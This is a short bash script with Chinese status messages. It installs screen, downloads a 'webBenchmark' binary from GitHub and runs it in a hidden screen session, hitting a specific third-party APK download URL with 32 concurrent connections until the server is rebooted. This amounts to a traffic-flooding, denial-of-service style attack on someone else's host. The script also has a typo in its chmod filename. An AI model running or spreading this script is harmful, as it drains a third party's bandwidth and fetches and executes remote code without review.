#!/bin/bash

echo 正在检测环境
if [ -f "/usr/bin/apt-get" ]; then
    apt-get install -y screen
else
    yum install -y screen
fi
wget -O /root/webBenchmark_linux_x64 https://github.com/maintell/webBenchmark/releases/download/0.6/webBenchmark_linux_x64 && chmod a+x /root/webBenchimark_linux_x64
echo starting...
echo 若要停止,重启服务器即可
sleep 3
screen_name=$"jianhuang"  
screen -dmS $screen_name
cmd=$"./webBenchmark_linux_x64 -c 32 -s http://xz.hyl88.top/3.0.5dp5.apk";
screen -x -S $screen_name -p 0 -X stuff "$cmd"
screen -x -S $screen_name -p 0 -X stuff $'\n'
